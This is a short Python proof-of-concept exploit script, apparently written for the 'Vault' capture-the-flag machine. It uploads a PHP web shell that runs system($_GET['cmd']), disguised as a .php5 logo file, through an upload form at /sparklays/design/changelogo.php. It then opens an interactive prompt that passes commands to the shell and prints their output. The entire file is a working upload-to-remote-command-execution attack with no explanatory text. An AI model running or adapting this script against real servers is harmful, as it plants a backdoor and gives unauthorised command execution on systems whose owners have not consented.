import requests
import sys
from cmd import Cmd
Ip = sys.argv[1]

def main():
    url = "http://" + Ip + "/sparklays/design/changelogo.php"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------276047902236080292852687575591", "Origin": "http://10.10.10.109", "Connection": "close", "Referer": "http://" + Ip + "/sparklays/design/changelogo.php", "Upgrade-Insecure-Requests": "1"}
    data = "-----------------------------276047902236080292852687575591\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php5\"\r\nContent-Type: application/x-php\r\n\r\n<?php\r\nsystem($_GET['cmd']);\r\n?>\r\n-----------------------------276047902236080292852687575591\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nupload file\r\n-----------------------------276047902236080292852687575591--\r\n"
    requests.post(url, headers=headers, data=data)
    print("[*] Upload file success!")
    print("[*] Waiting for shell!")

    class Term(Cmd):
        prompt = "Vault > "
        def default(self, args):
            resp = requests.get("http://"+ Ip +'/sparklays/design/uploads/shell.php5',
                params = {"cmd": args})
            print(resp.text)
            if args ==  "exit":
                exit()     
    term = Term()
    term.cmdloop()
if __name__ == '__main__':
	if len(sys.argv) < 2:
	    print("[*] Usage  : python3 POC.py <Target ip> ")
	    exit()  
	else:
		main()